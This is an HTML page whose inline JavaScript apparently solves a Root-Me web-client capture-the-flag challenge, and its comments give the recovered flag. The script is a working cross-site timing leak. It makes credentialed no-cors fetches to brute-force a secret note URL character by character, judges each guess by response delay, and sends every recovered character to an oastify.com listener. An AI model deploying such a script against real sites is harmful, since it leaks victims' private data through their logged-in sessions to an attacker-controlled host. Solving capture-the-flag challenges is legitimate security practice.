<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title></title>
</head>
<body>
<script type="text/javascript">
// first step : zc4r3_4b0ut
// second step : zc4r3_4b0ut_+s4mes1t3_
// flag : zc4r3_4b0ut_%252bs4mes1t3_c00k13 = zc4r3_4b0ut_+s4mes1t3_c00k13
var base_url = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/392/zc4r3_4b0ut_%2bs4mes1t3_';
var listener = 'https://xefzj04pbpafx8nokn70w1in7ed51ypn.oastify.com';

async function prepare_url(url) {
        var note_url = '';
        var start, time;
        var final_note = '';
        var stop = false;

        // I put `f` character at the end because there is a `fake_flag` and I don't really want to fetch it.
        for (let char of "abcdeghijklmnopqrstuvwxyz0123456789#@!$%^&*()+=~-_./,`f") {
                if (stop) {
                        break;
                }
                note_url = url + encodeURIComponent(char);
                // Start the clock
                start = performance.now();
                await fetch(note_url, {"credentials": "include", "method": "GET", "mode": "no-cors"}).then(() => {
                        // When fetch finishes, calculate the difference
                        time = performance.now() - start;
                        if (time > 2000) {
                                final_note = note_url;
                                stop = true;
                        }
                });
        }
        if (final_note == '') {
                // if it doesn't find anything, it returns `FINISHED` then return.
                await fetch(listener + '/?note=FINISHED', {"method": "GET", "mode": "no-cors"});
                return;
        }
        // if it finds the proper character, it returns the character after applying urlencode
        await fetch(listener + '/?note=' + encodeURIComponent(final_note.split('/').pop()), {"method": "GET", "mode": "no-cors"});
        // recursive function call to find next character
        prepare_url(final_note);
}

prepare_url(base_url);

</script>
</body>
